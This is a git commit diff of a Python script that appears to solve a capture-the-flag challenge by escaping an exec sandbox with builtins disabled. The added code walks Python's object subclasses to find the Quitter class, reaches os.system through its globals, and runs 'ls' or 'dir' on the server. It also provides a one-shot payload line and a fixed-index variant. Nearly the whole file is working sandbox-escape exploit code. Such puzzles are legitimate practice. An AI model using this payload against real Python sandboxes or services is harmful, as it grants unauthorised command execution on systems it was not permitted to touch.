21bea8ddd3740e64ca17f6ebf8a68bdb13ff049f
Cheaterdxd <44997314+cheaterdxd@users.noreply.github.com>
2021-10-25 11:45:11 +0700

    Update solve_misc1.py

--- solve_misc1.py
+++ solve_misc1.py
@@ -1,16 +1,20 @@
+# for testing at local 
 # text = ""
 # text = str(input())
 # exec(text, {'__builtins__': None, 'print':print})
 
+# try to list all the class of class type #list and find the Quitter
+for i in [].__class__.__base__.__subclasses__():
+    print(type(i))
+    if i.__name__ == "Quitter":
+        print(type(i))
+        i.__init__.__globals__['sys'].modules['os'].__dict__['system']('dir')
 
-# [w for w in ([].__class__.__base__.__subclasses__()) if w.__name__=='Quitter'][0].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')
-# for i in [].__class__.__base__.__subclasses__():
-    # print(type(i))
-    # if i.__name__ == "Quitter":
-        # print(type(i))
-        # i.__init__.__globals__['sys'].modules['os'].__dict__['system']('dir')
-    # _sitebuiltins.__init__.globals__['sys'].modules['os'].__dict__['system']('dir')
-# print(type([(i) for i in [].__class__.__base__.__subclasses__() if i.__name__=='Quitter'][0].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')))
-# [].__class__.__base__.__subclasses__()[-3].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')
+# oneshot for listing at the server
+print([(i) for i in [].__class__.__base__.__subclasses__() if i.__name__=='Quitter'][0].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls'))
 
-print(print.__class__.__base__.__subclasses__())
+
+# using this to input to the shell by exec ; -3 is the reverse index of Quitter in listing class
+[].__class__.__base__.__subclasses__()[-3].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls')
+
+# from cheaterdxd with love
